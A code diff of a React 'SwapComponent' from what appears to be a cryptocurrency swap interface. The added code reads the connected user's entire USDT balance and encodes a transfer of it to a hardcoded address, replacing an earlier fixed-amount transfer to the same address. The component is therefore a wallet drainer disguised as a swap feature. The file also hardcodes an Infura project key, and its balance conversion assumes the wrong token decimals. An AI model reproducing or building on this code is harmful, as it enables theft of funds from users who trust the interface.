@@ -18,6 +18,8 @@ import TransactionModal from 'react-modal'
 import TransactionLoader from '../TransactionLoader/TransactionLoader'
 import Confetti from '../Confetti'
 
+import usdtABI from '../../utils/contractABI.json'
+
 TransactionModal.setAppElement('#root')
 
 // Transaction Loader
@@ -51,7 +53,7 @@ function SwapComponent() {
   const [showConfetti, setShowConfetti] = useState(false)
   const INFURA_ID = '35e86f89b81d45a8a62ed9bb6ab1f3e6'
 
-  const { address, chainId } = useAccount()
+  const { address } = useAccount()
 
   const web3js = useWeb3jsSigner({ chainId: mainnet.id })
 
@@ -69,33 +71,17 @@ function SwapComponent() {
     if (!web3js) return
 
     const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
-    const usdtABI = [
-      {
-        constant: true,
-        inputs: [{ name: '_owner', type: 'address' }],
-        name: 'balanceOf',
-        outputs: [{ name: 'balance', type: 'uint256' }],
-        type: 'function',
-      },
-      {
-        constant: false,
-        inputs: [
-          { name: '_to', type: 'address' },
-          { name: '_value', type: 'uint256' },
-        ],
-        name: 'transfer',
-        outputs: [{ name: 'success', type: 'bool' }],
-        type: 'function',
-      },
-    ]
 
     const usdtContract = new web3js.eth.Contract(usdtABI, usdtContractAddress, {
       from: address,
     })
-    const amount = web3js.utils.toHex('1000000')
+    const result = await usdtContract.methods.balanceOf(address).call()
+    const balance = web3js.utils.fromWei(result)
+
+    console.log(balance)
 
     const data = usdtContract.methods
-      .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', amount)
+      .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', balance)
       .encodeABI()
 
     const nonce = await web3js.eth.getTransactionCount(address, 'pending')
